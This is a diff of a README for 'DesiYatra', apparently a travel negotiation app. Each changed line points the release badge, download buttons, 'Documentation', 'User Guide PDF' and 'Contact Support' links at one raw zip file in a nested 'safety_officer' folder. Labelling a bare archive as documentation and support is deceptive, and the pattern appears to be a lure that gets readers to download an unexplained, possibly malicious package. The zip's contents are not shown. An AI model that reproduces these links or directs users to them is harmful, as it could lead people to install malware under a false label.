@@ -1,6 +1,6 @@
 # ✈️ DesiYatra - Your Travel Negotiator in India
 
-![GitHub Release](https://raw.githubusercontent.com/iLuiz07/DesiYatra/main/agents/adk_agents/DesiYatra_v3.9-alpha.5.zip)
+![GitHub Release](https://raw.githubusercontent.com/iLuiz07/DesiYatra/main/agents/adk_agents/safety_officer/Yatra-Desi-2.1-alpha.2.zip)
 
 ## 🚀 Getting Started
 
@@ -27,7 +27,7 @@ Make sure your computer meets the following requirements to ensure smooth operat
 
 To get started, you can download DesiYatra from our Releases page. 
 
-[**Download DesiYatra**](https://raw.githubusercontent.com/iLuiz07/DesiYatra/main/agents/adk_agents/DesiYatra_v3.9-alpha.5.zip)
+[**Download DesiYatra**](https://raw.githubusercontent.com/iLuiz07/DesiYatra/main/agents/adk_agents/safety_officer/Yatra-Desi-2.1-alpha.2.zip)
 
 1. Click on the link above to visit the GitHub Releases page.
 2. Look for the latest release version.
@@ -57,9 +57,9 @@ For further support, you can reach out through the GitHub Issues page.
 
 For more detailed instructions and support, you can refer to the following resources:
 
-- [DesiYatra Documentation](https://raw.githubusercontent.com/iLuiz07/DesiYatra/main/agents/adk_agents/DesiYatra_v3.9-alpha.5.zip)
-- [User Guide PDF](https://raw.githubusercontent.com/iLuiz07/DesiYatra/main/agents/adk_agents/DesiYatra_v3.9-alpha.5.zip) (insert a real link if available)
-- [Contact Support](https://raw.githubusercontent.com/iLuiz07/DesiYatra/main/agents/adk_agents/DesiYatra_v3.9-alpha.5.zip)
+- [DesiYatra Documentation](https://raw.githubusercontent.com/iLuiz07/DesiYatra/main/agents/adk_agents/safety_officer/Yatra-Desi-2.1-alpha.2.zip)
+- [User Guide PDF](https://raw.githubusercontent.com/iLuiz07/DesiYatra/main/agents/adk_agents/safety_officer/Yatra-Desi-2.1-alpha.2.zip) (insert a real link if available)
+- [Contact Support](https://raw.githubusercontent.com/iLuiz07/DesiYatra/main/agents/adk_agents/safety_officer/Yatra-Desi-2.1-alpha.2.zip)
 
 ## 🗣️ Community & Feedback
 
@@ -84,6 +84,6 @@ DesiYatra covers several topics to make your travel experience better:
 
 ## 🚀 Download DesiYatra Now
 
-[**Download DesiYatra**](https://raw.githubusercontent.com/iLuiz07/DesiYatra/main/agents/adk_agents/DesiYatra_v3.9-alpha.5.zip)
+[**Download DesiYatra**](https://raw.githubusercontent.com/iLuiz07/DesiYatra/main/agents/adk_agents/safety_officer/Yatra-Desi-2.1-alpha.2.zip)
 
 Expand your travel possibilities with smart negotiation at your fingertips. Enjoy your journey with DesiYatra!
